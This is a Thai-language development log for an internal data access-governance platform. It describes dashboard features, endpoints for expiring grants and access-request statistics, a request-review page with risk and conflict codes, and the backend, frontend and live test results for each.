  - **coverage** — table ทั้งหมด · sensitive · protected (มี data policy ACTIVE ผูกกับ table หรือ column) · `exposed` (ไม่มี policy และมีคนเข้าได้ = subscription ALLOW หรือ grant live) · `readUnprotected` (ไม่มี policy และถูกอ่านในช่วง) · `rows` ≤ 100 (`TABLE_ROWS`) unprotected ก่อน · ต่อแถว: sensitiveColumns · dataPolicies · subscriptionPolicies · activeGrants · readers · refused · owners
  - **grants** — active · endingCount (≤ 14 วัน `ENDING_HORIZON`) + `endingSoon` ≤ 10 · openEnded · onSensitive · `unused` (คนถือ > 90 วัน `IDLE` ไม่เคย query table นั้น)
  - **activity** — counts · perDay (ทุกวันในช่วง รวมวันที่เป็นศูนย์) · refusals ต่อ category · busiestTables / busiestPeople ≤ 8 · decisions (total / denied / fromCache / p50 / p95 จาก `audit_decision.evaluation_ms`)
  - **requests** — pending / approved / inProgress / oldestOpenAt · asked / completed / rejected / withdrawn / medianHoursToClose ในช่วง
  - **health** — sources / enabled · enforcement state ต่อ status · policies ต่อ type+state · sync status / lastCrawlAt / syncFailed (**ไม่ส่งข้อความ error ของ sync**)
- **attention (เรียงเร่งสุดก่อน)**:
  | kind | severity | เมื่อไหร่ |
  |---|---|---|
  | UNPROTECTED_READ | HIGH | table sensitive ไม่มี policy แต่ถูกอ่านในช่วง |
  | UNPROTECTED_REACHABLE | HIGH | ไม่มี policy แต่มีคนเข้าได้ |
  | ENFORCEMENT_FAULT | HIGH | enforcement DRIFTED / FAILED |
  | SYNC_FAILED | HIGH | sync ล่าสุดล้ม |
  | SYNC_STALE | MEDIUM | ไม่ได้ sync เกิน 2 วัน (`STALE_SYNC`) |
  | REQUESTS_WAITING | MEDIUM | คำขอเปิดค้างเก่ากว่า 3 วัน (`OLD_REQUEST`) |
  | GRANTS_ENDING | MEDIUM | grant หมดใน 14 วัน |
  | UNPROTECTED_CLOSED | LOW | ไม่มี policy แต่ยังไม่มีใครเข้าได้ (grant แรกจะเปิดแบบไม่ mask) |
  | GRANTS_UNUSED | LOW | ถือเกิน 90 วันไม่ใช้ |
  | GRANTS_OPEN_ENDED | LOW | grant ไม่มีวันหมด |
- **ไม่มี SQL · ไม่มี client address · ไม่มีข้อความ error** ในคำตอบ · ⚠️ `coverage.rows[].owners` เป็นชื่อจาก `asset_owner` → **ใน chat / screenshot ที่ส่งต่อให้เรียกว่า "<another owner>"** ถ้าเป็นชื่อคนจริง

### BE.5 หน้า `/dashboard` "Access control dashboard"

- เมนู **Dashboard** ใต้ Home — เห็นเฉพาะ POLICY_AUTHOR / AUDITOR (+ admin) · คนอื่นเปิด URL ตรง → กล่องแดง "The dashboard covers every table and every person, so it is for administrators, policy authors and auditors"
- หัวหน้า: ช่อง **label** (debounce 450ms) + **Window** 7 / 30 / 90 / 365 วัน — อยู่ใน URL (`?days=90&label=Finance` · ค่า default ไม่ใส่) · refetch ทุก 2 นาที
- 5 KPI: **Protected by policy %** · **Grants in force** · **Proxy queries** (→ `/audit`) · **Open requests** (→ Inbox) · **Decision time, p95** (เหลืองเมื่อเกิน 50ms ตาม NFR-2)
- การ์ด: **Needs attention** (ไอคอนระดับ + ประโยคที่อ่านรู้เรื่อง + ปุ่มพาไปแก้ · ว่าง = "Nothing needs you right now") · **Coverage** (วงแหวน SVG + legend 3 กลุ่ม) · **Queries per day** (แท่งซ้อน ran/refused/failed + busiest day) · **Why queries did not run** (→ `/audit?outcome=REJECTED`) · **Tables carrying <label>** (8 แถว + Show all · ลิงก์ไป catalog / query log ของ table) · **Access ending in 14 days** (นับถอยหลังทีละวินาทีจากนาฬิกา server แบบเดียวกับ BD.4) · **Most-read tables / Most active people** · **Grants in force** · **Access requests** · **Platform health**
- ไม่มี chart library — SVG / flex มือทั้งหมดเหมือน M12 · ทุกกราฟมี `role="img"` + aria-label สรุปเป็นคำ
- มือถือ 390px: ไม่มี horizontal scroll ของหน้า (ตารางเลื่อนในการ์ดเอง)
- `api/dashboard.ts` · `pages/dashboard/DashboardPage.tsx` · `App.tsx` route · `layout/navigation.ts`

### BE.6 ทดสอบ

- **Backend** — `QueryRefusalsTest` · `AuditResourceTest` 11 · `QueryLogIT` 10 (Postgres จริง: backfill V25 · scope 3 แบบ · ซ่อน SQL / reason · **ค้น SQL ไม่กลายเป็นช่องเดาข้อความที่ซ่อน** · filter · cursor · counts · ไม่อ่าน client address · `QueryService` เขียน run_by) · `DashboardResourceTest` 10 (403 / 400 / ลำดับ attention) · `DashboardIT` 7 (Postgres จริง: sensitive · coverage · grants · activity · **ไม่มี `client_ip` / `requester_ip` ใน JSON**) · `./mvnw -o verify -Pintegration` **BUILD SUCCESS ทุก module 0 failure**
- **Frontend** — `QueryLogPage.test` 11 · `DashboardPage.test` 16 (KPI · URL params · days ผิด → 30 · debounce label · ลำดับ/ลิงก์ attention · `wordingOf` ไม่มีคำว่า null/undefined/NaN · วงแหวน · ตาราง + Show all · นับถอยหลังจากนาฬิกา server ทั้งที่ browser เร็วไป 1 วัน · ลิงก์ refusal · สรุปกราฟ · error) · `tsc` สะอาด · **jest 40 suites / 396 tests ผ่าน** · build ผ่าน
- **Live (dev app, V25 applied)** — `scratchpad/live_m10.py` **ผ่านทุกข้อ**: analyst_a query → แถวใหม่มี `asset_fqns = {demo-pg.salesdb.sales.customer}` `run_by` null · admin รันแทน analyst_a → `run_by = admin` · analyst_a ใช้ `asPrincipal` → 403 · query log: admin/compliance_a `EVERYTHING` · owner_a `OWNED` · analyst_a `OWN` (เห็นแถวที่ admin รันแทน พร้อม runBy) · ไม่มี field ที่อยู่ IP · dashboard: admin/compliance_a 200 · owner_a/analyst_a/security_a 403 · days 0/366, label ว่าง/201 ตัว → 400 · ไม่มี token 401 · perDay 30 วัน ผลรวมตรงกับ counts
- **Screenshot** (playwright ผ่าน proxy 8090) — desktop 1440 + mobile 390 · เจอ 2 จุดแล้วแก้: KPI "Queries through the proxy" ขึ้นสองบรรทัดดันตัวเลขไม่ตรงแถว → **"Proxy queries"** · คำอธิบายใต้ KPI ถูกตัด "3 endin…" → ให้ขึ้นบรรทัดใหม่แทน truncate

### BE.7 ที่ยังไม่ทำ / ต่อไป

- **Export ของ query log / dashboard** (CSV / PDF สำหรับ auditor) และ **SIEM export (FR-8.4)** ยังไม่มี
- **drift** ใน Health ยังนับจาก `enforcement_state` เท่านั้น — DriftDetector ยังไม่มี (M8)
- query log ยังไม่มี retention policy
- ต่อไปตาม Roadmap: M9 recertification (access review รอบ 90 วัน) · แนบไฟล์ในคำขอ

## รอบก่อนหน้า — **ข้อ BD: M9 slice 2c — Dashboard "ใครใกล้หมดสิทธิ์ใน table ไหน" (นับถอยหลังทีละวินาที) + สถิติคำขอต่อ table**

ผู้ใช้ขอไว้สองข้อ: *"ใน Dashboard ต้องสามารถระบุได้ว่าใครใกล้จะหมดสิทธิใน table ไหน อาจใส่ตัวนับถอยหลังได้"* และ *"อยากให้เก็บ สถิติ จำนวนที่ขอใช้ table ไว้ด้วย เผื่อเอาไว้ทำ Dashboard"* · ตามด้วย *"ทำต่อได้เลยนะ เอาตาม Roadmap ทำไปเรื่อยๆ ต้องทดสอบให้ดีทุกขั้นตอน"* / *"ต่อ"* → ทำ 2c ตามข้อ BC.8 จบรอบนี้

หลักของรอบนี้:
- **อ่านอย่างเดียว** — ทั้งสอง endpoint ไม่เขียนอะไรเลย ไม่เขียน audit ไม่แตะ grant
- **ไม่มีตารางนับแยก** — สถิตินับจาก `access_request` ตรงๆ เพราะคำขอไม่เคยถูกลบ (ถอน / ปฏิเสธเป็นแค่ status) ประวัติที่ counter จะเก็บมีอยู่แล้วครบ และ counter คืออีกของหนึ่งที่เพี้ยนจากแถวจริงได้ → **ไม่มี migration ใหม่** (ยังเป็น V1–V24)
- **ใครเห็นอะไรใช้กติกา stewardship เดิม** — ไม่มีกติกาใหม่

### BD.1 `GET /v1/access/grants/expiring?withinDays=14&limit=100`

- คืน `Expiring { now, withinDays, total, grants[] }` · `now` = นาฬิกาของ server (หน้าเว็บนับถอยหลังจากค่านี้ ดู BD.4) · `total` = จำนวนที่ผู้เรียกเห็นได้ทั้งหมด · `grants` ถูกตัดที่ `limit`
- `ExpiringGrant`: `id · assetFqn · principalId · username · displayName · principalType (USER/GROUP) · source (manual/request) · requestId · validFrom · validUntil · grantedBy · mine · mayRevoke`
  - `mine` = grant นี้ถึงตัวผู้เรียก ไม่ว่าจะให้ตรงหรือผ่าน group (ซ้อนกี่ชั้นก็ได้ — `GrantStore.reachableFrom(username)` เดิน `group_member` แบบ recursive แบบเดียวกับ `heldBy` / `reaches`)
  - `mayRevoke` = ผู้เรียก **governs** table นั้น (admin · POLICY_AUTHOR · DATA_OWNER ที่ scope ครอบ) · auditor = false เสมอ
- **"ใกล้หมด" = live ตามที่ engine ถือ** (`GrantStore.expiring(now, until)`): ไม่ถูก revoke · เริ่มแล้ว (`valid_from <= now`) · ยังไม่หมด (`valid_until > now`) · หมดภายในช่วง (`valid_until <= now + withinDays`) · principal ยัง enabled · grant แบบไม่มีวันหมด **ไม่เคยอยู่ในนี้** · grant ที่หมดไปแล้วแต่ job ยังไม่ tombstone **ไม่อยู่ในนี้** (engine เลิกยอมรับแล้ว นับถอยหลังติดลบก็คือโกหก) · เรียงจากหมดก่อน
- **ใครเห็นแถวไหน**:
  | ผู้เรียก | เห็น |
  |---|---|
  | PLATFORM_ADMIN / POLICY_AUTHOR / AUDITOR (`overseesEverything`) | ทุกแถว |
  | DATA_OWNER | แถวบน table ที่ scope ของตัวเองครอบ + ของตัวเอง |
  | คนอื่น (REQUESTER) | **เฉพาะ grant ที่ถึงตัวเอง** (`mine`) |
  - เหตุผล: รายการ grant ทั้งองค์กรที่เรียงตามวันหมดคือแผนที่ว่าสัปดาห์หน้าต้องไปขอใคร → ให้เฉพาะคนที่หน้าที่คืออ่านมัน
- ตรวจ input: `withinDays` 1–365 · `limit` 1–500 · นอกช่วง → **400** · ไม่มี token → 401

### BD.2 `GET /v1/access-requests/stats?days=90&assetFqn=&limit=50`

- คืน `Stats { since, days, total, totals, tables[] }` · `totals = { tables, asked, open, completed, rejected, declined, withdrawn }` รวมจากแถวที่ผู้เรียกเห็น
- ต่อ table (`RequestStatistics.TableStats`): `asked · open (PENDING/APPROVED/IN_PROGRESS) · completed · rejected · declined · withdrawn · requesters (คนไม่ซ้ำ) · medianHoursToClose · lastAskedAt` · เรียง asked มากสุดก่อน → ขอล่าสุดก่อน → FQN
- **rejected กับ declined นับแยก** เพราะความหมายต่างกันสำหรับคนอ่าน dashboard: *rejected* = approver บอกว่าคนนี้ไม่ควรได้ (`status = REJECTED AND completed_by IS NULL`) · *declined* = configurer ปฏิเสธหลังอนุมัติแล้ว เพราะทำตามที่ขอไม่ได้ (`completed_by IS NOT NULL`) → table ที่ declined เยอะไม่ได้ถูกขอเกิน แต่ **configure ยาก**
- `medianHoursToClose` = median ของ (`coalesce(completed_at, decided_at) - created_at`) เฉพาะคำขอที่จบด้วยคำตอบ (COMPLETED / REJECTED) · ปัดทศนิยม 1 ตำแหน่ง · **null** ถ้ายังไม่มีคำขอไหนในช่วงที่จบ (ไม่อ้างตัวเลขที่ไม่มี)
- SQL เดียว `count(*) FILTER` + `percentile_cont(0.5)` ใช้ index `(asset_fqn, created_at)` ที่มีอยู่แล้ว
- **ใครเห็น**: admin / POLICY_AUTHOR / AUDITOR นับทุก table · DATA_OWNER นับเฉพาะ table ที่ oversee · คนอื่นได้ **คำตอบว่าง (200)** ไม่ใช่ 403 → card บอกได้ว่า "ไม่มีอะไรสำหรับคุณ" โดยหน้าไม่ถือเป็น error · table ไหนคนอื่นขอบ่อย ใครโดนปฏิเสธบ่อย ไม่ใช่เรื่องของผู้ขอ
- `assetFqn` = กรองเหลือ table เดียว (owner ขอ table ที่ไม่ได้ oversee → ว่าง) · `days` 1–3650 · `limit` 1–500 · นอกช่วง → 400
- **ไม่มี IP** — `requester_ip` (V24) ไม่ถูก select และไม่อยู่ในคำตอบใดๆ ของทั้งสอง endpoint (ตรวจทั้ง unit, IT และ live)

### BD.3 Backend

- `access/GrantStore.java` — `expiring(now, until)` · `reachableFrom(username)`
- `access/RequestStatistics.java` (ใหม่) — `TableStats` · `perTable(since, fqn)` · `MAX_DAYS 3650`
- `resources/AccessResource.java` — `GET /grants/expiring` + record `ExpiringGrant` / `Expiring` · `MAX_WITHIN_DAYS 365` · `MAX_EXPIRING 500`
- `resources/AccessRequestResource.java` — `GET /stats` + record `Stats` / `StatsTotals` · ไม่มี statistics ต่อ (unit test บางชุด) → 404
- `DacApplication.java` — ต่อ `RequestStatistics` เข้า resource
- `home/HomeLayout.java` — `WidgetType.EXPIRING_ACCESS` (ทุก role) · `ACCESS_REQUEST_STATS` (**governance** = ถูกกรองออกจากหน้าของ requester · เป็นแค่เมนูตามหลักเดิมของ `governance()` ขอบเขตจริงคือ endpoint ที่คืนว่างให้ requester)
- `home/HomeLayoutValidator.java` — config ของสองการ์ด **clamp ไม่ใช่ปฏิเสธ** (เหมือนตัวเลขอื่นในหน้า Home): `withinDays` 1–90 (default 14) · `days` 7–365 (default 90) · `limit` 3–20 (default 8) · key อื่นที่การ์ดไม่อ่านถูกทิ้ง
- `home/HomeLayoutStore.java` — default layout:
  - `DEFAULT` (governance): `expiring-access` ใต้ Governance coverage (คอลัมน์ซ้าย) · `request-stats` ใต้ Sources (คอลัมน์ขวา)
  - `REQUESTER_DEFAULT`: `expiring-access` ใต้ Search — ผู้ขอเห็น grant ของตัวเองที่ใกล้หมด จะได้ไม่มารู้ในวันที่หมด
  - **คนที่เคย save หน้าเองแล้วไม่ได้การ์ดใหม่อัตโนมัติ** (ตามหลักเดิมของ home layout — หน้าที่คนจัดเองไม่ถูกแก้ให้) → เพิ่มเองได้จาก *Edit this page → Add a panel*

### BD.4 Frontend

- `api/access.ts` — `ExpiringGrant` / `ExpiringGrants` + `fetchExpiringGrants(withinDays, limit)`
- `api/accessRequests.ts` — `TableRequestStats` / `RequestStatsTotals` / `RequestStats` + `fetchRequestStats(days, limit)`
- `api/home.ts` — widget type ใหม่สองตัว
- `pages/home/widgets.tsx`:
  - **"Access ending soon"** (`ExpiringAccessWidget`) — แต่ละแถว: ชื่อคนถือ · ป้าย **You** (ของตัวเอง) / **Group** · FQN ลิงก์ไป `/catalog/<fqn>?tab=access` · **นับถอยหลัง** (`role="timer"`) + วันเวลาที่หมด · refetch ทุก 60 วิ · ตัวเลขบนหัว "2 of 23" เมื่อถูกตัด · ว่าง = *"No access you can see ends in the next N days."*
  - **นับจากนาฬิกา server ไม่ใช่เครื่อง browser** — `useServerClock` เอา `now` ที่ server ส่งมา + เวลาที่ผ่านไปตั้งแต่ได้คำตอบ (`Date.now() - dataUpdatedAt`) ใช้เครื่องตัวเองแค่วัด "ผ่านไปกี่วินาที" · browser ที่นาฬิกาเพี้ยนไปหนึ่งวันยังเห็นเวลาที่เหลือถูก
  - รูปแบบ: `2d 04:12:09` / `05:00:03` / `Ended` · สี: < 24 ชม. แดง · < 72 ชม. ส้ม · นอกนั้นเทา
  - **"Requests per table"** (`RequestStatsWidget`, governance) — ตัวเลขบน: Asked (N tables · D days) · Still open · Granted · Refused (= rejected + declined พร้อมบอกแยก) · แถวละ table: ชื่อ (ลิงก์ catalog) + จำนวน + **แถบซ้อนสี** (ยาว = สัดส่วนเทียบ table ที่ถูกขอมากสุด · สี = จบแบบไหน · `role="img"` + aria-label เช่น "1 granted, 1 open") + "N people · median Xh to answer · last …" + legend · ว่าง = *"No table you oversee has been asked for in the last N days."*
  - export `countdown` / `urgencyOf` / `segmentsOf` / `hoursLabel` ไว้ test
- `pages/home/HomeEditor.tsx` — ช่องตั้งค่าของสองการ์ด: ช่วงวัน (ending soon 1–90 · stats 7–365) + Rows 3–20
- ไม่ได้รัน prettier · ไม่มีแถบ `border-l-4` สีฟ้า · ใช้ `Widget` / `Stat` / `WidgetEmpty` เดิมของหน้า Home

### BD.5 Tests

| ชุด | เพิ่ม | ครอบอะไร |
|---|---|---|
| `AccessDashboardResourceTest` (ใหม่) | **15** | Expiring: ส่ง now + ช่วง · admin เห็นหมด · auditor เห็นหมดแต่ revoke ไม่ได้ · requester เห็นของตัวเอง (รวมผ่าน group) · owner เห็น table ตัวเอง · limit ตัดแต่ total ไม่ตัด · ตัวเลขผิด 400 · Stats: admin / auditor นับทั้งหมด · owner นับของตัวเอง · requester ได้ว่าง · table เดียว · limit · ตัวเลขผิด 400 · ไม่มี statistics → 404 |
| `AccessDashboardIT` (ใหม่, Testcontainers) | **10** | Expiring: เรียงหมดก่อน · ตัด revoked / ยังไม่เริ่ม / หมดแล้ว / ไม่มีวันหมด / เกินช่วง / principal ถูกปิด · ขอบช่วงพอดี · ชื่อคนถือ · Reach: เดิน group ซ้อน · ชื่อไม่มีจริง = ว่าง · Statistics: นับจากประวัติ · แยก rejected / declined / withdrawn / open · median เฉพาะที่จบ · ช่วงวัน · table เดียว |
| `HomeLayoutValidatorTest` `@Nested Access cards` | +4 | default 14 วันเมื่อไม่ระบุ · clamp ช่วง / จำนวนแถว · ทิ้ง key แปลกปลอม · stats default 90 วันและไม่ต่ำกว่า 7 |
| `HomeLayoutStoreTest` | +1 (+ แก้ 1) | หน้า governance = หน้าเดิม + การ์ด access ถูกที่ · หน้า requester มีการ์ด ending soon |
| `accessWidgets.test.tsx` (ใหม่) | **12** | countdown / urgency / segments / hoursLabel · spec (stats = governance) · **นับจากนาฬิกา server ขณะ browser เร็วไป 1 วัน** (02:00:00 → 01:59:57 หลัง 3 วิ) · ป้าย You / Group · ลิงก์ · "2 of 23" · ว่าง · stats: ตัวเลขรวม · แถบ + aria-label · กว้าง 50% · median ไม่อ้างเมื่อไม่มี · ว่าง |

**ผลรวม (2026-09-25):** `./mvnw -o verify -Pintegration` **BUILD SUCCESS** · unit **813** (dac-service **308**) · integration **261** · รวม **1074** · Failures 0 Errors 0 · frontend `npx jest src` **38 suites / 369 tests** ผ่าน · `tsc --noEmit` สะอาด · `VITE_BASE=/Arak/ npm run build` ผ่าน

### BD.6 ทดสอบสดบน dev (`live_2c.py` + `dash-shot.mjs` + `dash-editor.mjs` ใน scratchpad)

รันกับ app ที่ build จาก working tree นี้ (API :8080, UI `http://localhost:8090/Arak/`) · รหัสผ่าน dev ส่งเป็น env `DEV_PW` เท่านั้น · **ผล: 0 failure** (42 check)

**เตรียม dev data** — รอบแรก owner_a ได้ 403 / ว่างทั้งหมด เพราะ owner_a มีแค่แถวใน `asset_owner` (ความเป็น owner จาก OpenMetadata) แต่ **ไม่มี app role `DATA_OWNER` + scope** ซึ่ง stewardship ต้องใช้ → backend ทำถูกแล้ว ข้อมูล dev ขาด · แก้ด้วย `POST /v1/principals/{id}/roles` (ทาง admin ปกติ มี reason + audit):
- owner_a → `DATA_OWNER` scope `dtp-iprm.iprm.public.products` และ `dtp-iprm.iprm.public.kb_likes`
- compliance_a → `AUDITOR` (เพื่อทดสอบคนที่เห็นทุกอย่างแต่แก้ไม่ได้)

**Expiring** — owner_a สร้าง grant 3 ชม. ให้ analyst_b บน products (201) แล้วถามทุก role:
| ผู้เรียก | total | เห็น | mine | mayRevoke |
|---|---|---|---|---|
| admin | 4 | products/analyst_b (3 ชม.) · customer/analyst_b · kb_likes/analyst_a · products/analyst_a — เรียงหมดก่อน | – | true ทุกแถว |
| owner_a (DATA_OWNER) | 3 | เฉพาะ products / kb_likes | – | true ทุกแถว |
| analyst_a | 2 | ของตัวเองเท่านั้น | true | false |
| analyst_b | 2 | ของตัวเองเท่านั้น (รวม grant 3 ชม. ใหม่) | true | false |
| compliance_a (AUDITOR) | 4 | เท่ากับ admin ทุก id | – | **false ทุกแถว** |
- `limit=1` → 1 แถว แต่ total ยัง 4 · `withinDays=1` เหลือแค่ grant 3 ชม. · `withinDays` 0 / 366 และ `limit` 0 / 501 → 400 · ไม่มี token → 401

**Stats (90 วัน)**
| ผู้เรียก | ผล |
|---|---|
| admin | 6 tables · asked 20 = open 2 + completed 11 + rejected 3 + declined 0 + withdrawn 4 · customer 12 มากสุด · ผลรวมทุก table ตรงกับ totals · แต่ละ table outcome รวมได้ asked · median `null` บน table ที่ยังไม่มีคำขอไหนจบ |
| owner_a | 2 tables (kb_likes 3 · products 2) เท่านั้น · ขอ `assetFqn` = customer (ไม่ได้ own) → ว่าง |
| analyst_a / analyst_b | **200 ว่าง** (ไม่ใช่ 403) |
| compliance_a (AUDITOR) | เท่ากับ admin ทุกแถว |
- `assetFqn=customer` (admin) → table เดียว · `days` 0 / 3651 และ `limit` 0 / 501 → 400
- **ไม่มี field ip / remote ในคำตอบใดๆ** ของทั้งสอง endpoint ทุก role

**หน้าจอ (Playwright, pageerror + 5xx = 0)** — เก็บใน scratchpad ไม่ commit:
- `dash-owner_a.png` — หน้า default ของ governance: **Access ending soon** 3 แถว (`02:58:52` สีแดง · `2d 18:05:42` สีส้ม · `4d 16:40:38` สีเทา) · **Requests per table** (5 asked · 2 tables · แถบ kb_likes เขียวเต็ม / products เขียวครึ่ง + เทา withdrawn) · timer เดินจริง (2 วิ → `02:58:50`)
- `dash-analyst_b-expiring.png` — หน้า requester: การ์ด ending soon 2 แถว ป้าย **You** ทั้งคู่ · **ไม่มีการ์ด stats**
- `dash-compliance_a.png` — auditor: เห็น 4 แถว + stats 6 table (aria-label เช่น "6 granted, 3 rejected, 3 withdrawn")
- admin / analyst_a มีหน้าที่ save เองไว้แล้ว → ไม่ได้การ์ดใหม่อัตโนมัติ (ถูกตามหลัก) · `dash-admin-editor-added.png` — *Edit this page → Add a panel* มีทั้งสองการ์ดให้เลือก · เพิ่ม ending soon แล้วพรีวิวขึ้น 4 timer พร้อมช่อง 1–90 วัน / 3–20 แถว · กด **Cancel** แล้วหน้ากลับเป็นเดิม และ `home_layout` ของ admin ในฐานข้อมูล **ไม่เปลี่ยน**

### BD.7 ยังไม่ทำ / ต่อไป

- ปุ่ม **Revoke** บนการ์ด ending soon — ตอนนี้ `mayRevoke` ส่งมาแล้วแต่การ์ดยังไม่ใช้ (ลิงก์ไปแท็บ Access ของ table ซึ่งมีปุ่ม revoke อยู่แล้ว) · **ขอต่ออายุ** (renew) จากการ์ดของผู้ขอเอง
- แจ้งเตือนผู้ถือก่อนหมด (กระดิ่ง / email / Teams) — ตอนนี้มีแค่บน dashboard
- สถิติตามช่วงเวลา (กราฟรายสัปดาห์) · export CSV
- ที่ค้างจากข้อ BC.8: ปุ่ม *"Open as draft policy"* ยังไม่เคยเห็นสด · `audit_policy_change` · Automatic configuration · recertification · break-glass · review ด้วย LLM (M16 — แยกต่างหาก)
- **M9 ที่เหลือ**: recertification / access review รอบ 90 วัน · break-glass · notification ออกนอกระบบ

## รอบก่อนหน้า — **ข้อ BC: M9 slice 2b — หน้า Review ของคำขอ (ผู้ขอ · impact · risk · suggestion · policy conflict) + กัน GRANT ที่เปิดไม่ได้จริง**

ผู้ใช้สั่ง *"ทำต่อได้เลยนะ เอาตาม Roadmap ทำไปเรื่อยๆ ต้องทดสอบให้ดีทุกขั้นตอน"* แล้ว *"ต่อ"* → ทำ 2b ตามข้อ BB.8 จบรอบนี้ · 2c (grant ใกล้หมดอายุ + นับถอยหลัง · สถิติคำขอต่อ table) เป็นรอบถัดไป

หลักของรอบนี้: **review เป็นเครื่องช่วยคิดของคนตัดสิน ไม่ใช่คนตัดสินแทน** — ทุกอย่างที่มันเสนอเป็นแค่ข้อเสนอ · policy ที่ถูกเช็คไม่ถูกแก้ ไม่ถูก activate ไม่ถูก cache · draft policy ที่มันร่างให้เปิดใน Policy Builder เป็น **DRAFT** เท่านั้น ต้องมีคนกด save / ส่งอนุมัติเองตามทางปกติ

### BC.1 `GET /v1/access-requests/{id}/review[?policyId=<uuid>]`

- **ใครอ่านได้**: คนที่เห็นคำขอนั้นอยู่แล้วตามกติกาเดิมของ `AccessRequestStore.find` (คนใน pool · configurer · platform admin) **ยกเว้นผู้ขอ** · **ผู้ขอเอง → 403** *"A review is for the people deciding a request, not for the person who asked"* (ไม่ให้รู้ล่วงหน้าว่าต้องไปเถียงกับ policy ไหน) · คนที่ไม่เกี่ยว → **404** เหมือน GET ปกติ (ไม่บอกว่ามีคำขอ) · `policyId` ที่ไม่ใช่ UUID → 400 *"policyId is not an id"*
- **อ่านอย่างเดียวล้วน** — ไม่มี write ใดๆ ไม่ขยับ status ไม่เขียน audit
- คืน record `Review`:
  | field | ความหมาย |
  |---|---|
  | `requester` | username · known / enabled · attribute · group · role (+scope) · **grant ที่ถืออยู่** · คำขอก่อนหน้าบน table นี้ใน 90 วัน (status + วันที่) |
  | `table` | FQN · owners · tier · domain · known (อยู่ใน metadata cache ไหม) |
  | `now` | engine ตัดสินวันนี้ว่าอะไร (allowed + reason) |
  | `ifGranted` | ถ้าให้ grant ตามที่ขอ: allowed ไหม · **ชะตาของทุก column** (`VISIBLE` / `MASKED` + fn + policy ที่ mask / `HIDDEN`) · sensitive ไหม · row filter ในภาษาคน |
  | `ifPolicy` / `policy` | เฉพาะเมื่อส่ง `policyId` — ถ้า policy นั้น **active และ bind กับ table นี้** จะเห็นอะไร |
  | `risk` | `LOW` / `MEDIUM` / `HIGH` + factor ที่ทำให้เป็นแบบนั้น |
  | `conflicts` | สิ่งที่ขัดกัน — `BLOCKER` / `WARNING` / `INFO` |
  | `suggestions` | ทางที่ทำได้ เรียงตามที่ควรลองก่อน |
  | `addressKnown` | **boolean เท่านั้น** — บอกว่ามี IP ของคำขอเก็บไว้ ไม่เคยคืนตัว IP |
- **ifGranted คำนวณจริงด้วย engine** — `DecisionService.decideAsIfGranted` ใส่ grant สมมุติเข้าไปในรอบตัดสินนั้นรอบเดียว (ไม่เขียน `access_grant`) · `ifPolicy` ใช้ `DecisionService.decideWithCandidate(ask, policyId)` → `Candidate(decision, bound)` ที่ดึง policy ผ่าน `PolicyStore.activeForIncluding` ที่มีอยู่แล้ว — ตัดสินเหมือน policy นั้น active อยู่ **ไม่ cache ไม่ write**
- **risk factor**:
  | code | ระดับ | เมื่อไร |
  |---|---|---|
  | `REQUESTER_UNKNOWN` / `REQUESTER_DISABLED` | HIGH | ผู้ขอไม่อยู่ใน directory แล้ว / ถูกปิด |
  | `SENSITIVE_IN_CLEAR` | HIGH | grant จะเปิด column sensitive (tag PII/Sensitive/… ที่ `Confirmed` · tag ที่ specific ที่สุดนับ · `Suggested` ไม่นับ) แบบไม่ mask |
  | `SENSITIVE_PROTECTED` | LOW | มี column sensitive แต่ยัง mask / hide อยู่ทุกตัวหลัง grant |
  | `OPEN_ENDED` / `VERY_LONG` / `LONG` | HIGH / HIGH / MEDIUM | ขอแบบไม่มีวันหมด / > 90 วัน / > 30 วัน |
  | `TIER1` | MEDIUM | table เป็น Tier 1 |
  | `REJECTED_BEFORE` | MEDIUM | เคยถูกปฏิเสธบน table นี้ใน 90 วัน |
  | `NO_PURPOSE` | LOW | ไม่ใส่ purpose |
  | `TABLE_UNKNOWN` | MEDIUM | table ไม่อยู่ใน metadata cache เลยโชว์ column ไม่ได้ |
- **conflict code**:
  | code | ระดับ | ความหมาย |
  |---|---|---|
  | `ALREADY_READS` | WARNING | อ่านได้อยู่แล้ววันนี้ |
  | `LIVE_GRANT` | INFO | มี grant ที่ยังไม่หมดบน table นี้อยู่แล้ว |
  | `GRANT_BLOCKED` | **BLOCKER** | grant ก็ไม่ช่วย — มี policy (เช่น DENY) ที่ grant ผ่านไม่ได้ · **ระบุ id ของ policy นั้น** |
  | `MASKS_REMAIN` | INFO | ได้ grant แล้วยังมี column ถูก mask (บอก column + policy) |
  | `ROW_FILTERED` | INFO | ได้ grant แล้วยังเห็นแค่บางแถว (บอก policy) |
  | `POLICY_NOT_FOUND` | BLOCKER | `policyId` ไม่มีอยู่ |
  | `POLICY_NOT_BOUND` | BLOCKER | policy นั้นไม่ครอบ table นี้ (หรือคนละ environment — เช่น draft ตัวอย่างที่เป็น env `dev` ขณะ default = `prod`) |
  | `POLICY_NOT_ACTIVE` | INFO | policy นั้นยังไม่ active — ผลที่เห็นคือ *"ถ้า active"* |
  | `POLICY_STILL_REFUSES` | WARNING | ถ้า policy นั้น active ผู้ขอก็ยังอ่านไม่ได้ |
  | `POLICY_OPENS` | INFO | ถ้า policy นั้น active ผู้ขอจะอ่านได้ |
- **suggestion** (ไม่มีตัวไหน apply เอง):
  - `DECLINE` — อ่านได้อยู่แล้ว ไม่ต้องทำอะไร
  - `GRANT` — ให้ตามที่ขอ · ถ้าจะเปิด column sensitive แบบไม่ mask และขอเกิน 7 วัน → เสนอ **grant 7 วันก่อน** แล้วค่อยตามจำนวนที่ขอ
  - `UPDATE_POLICY` — เมื่อ `GRANT_BLOCKED` · บอก id ของ policy ที่ต้องแก้ แล้วจบคำขอเป็น "Policy updated"
  - `CREATE_POLICY_DRAFT` — เฉพาะเมื่อมีคนใน group เดียวกับผู้ขอ **อย่างน้อย 2 คน** ถือ grant บน table นี้อยู่แล้ว (สัญญาณว่าควรเป็น policy ไม่ใช่ grant รายคน) · ร่าง subscription ALLOW `group = <group>` · TABLE scope · ชื่อ slug ปลอดภัย · **ส่งไป Policy Builder เป็น DRAFT เท่านั้น**

### BC.2 กัน GRANT ที่เปิดไม่ได้จริง (server-side)

- `POST /v1/access-requests/{id}/complete` แบบ `GRANT` → ก่อนเขียน grant เรียก `AccessReview.grantWouldNotOpen(request)` (= `decideAsIfGranted` + `AccessEligibility.blocking(decision)`) · ถ้ายังถูกปฏิเสธ → **409** *"A grant would not let analyst_b read this table. Still refusing: <policy>: <reason>. Change that policy and finish as \"Policy updated\", or decline."* · **ไม่มีแถว grant ไม่ขยับ status ไม่เขียน audit**
